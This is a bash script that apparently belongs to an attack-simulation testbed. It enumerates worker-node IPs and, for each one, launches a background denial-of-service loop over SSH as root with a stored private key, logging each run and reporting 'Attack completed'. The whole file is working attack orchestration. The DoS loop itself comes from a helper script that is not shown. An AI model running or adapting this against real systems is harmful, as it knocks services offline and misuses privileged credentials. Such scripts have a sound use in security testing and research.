#!/usr/bin/env bash
set -euo pipefail

BASE="$DATA_PATH/KC5"
FILE_IP="/tmp/iphost"
KEY_PATH="$BASE/ssh/ssh-key"
LOG_DIR="$BASE/logs"
PID_LIST="$BASE/pids"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NODE_IP_HELPER="${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/list-node-ips.sh"

[[ -f "${NODE_IP_HELPER}" ]] || { echo "Missing helper: ${NODE_IP_HELPER}" >&2; exit 1; }
# shellcheck source=../../lib/common/list-node-ips.sh
source "${NODE_IP_HELPER}"

mapfile -t nodes < <(list_worker_node_ips "$FILE_IP" | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
for n in "${nodes[@]}"; do
  LOG_FILE="$LOG_DIR/$n-dos.log"
  nohup ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/dos-loop.sh "ssh -p 2222 -i $KEY_PATH root@$n" >>"$LOG_FILE" 2>&1 &
  pid=$!
  echo "$pid" | tee -a "$PID_LIST"
  echo "Attack completed for $n"
done
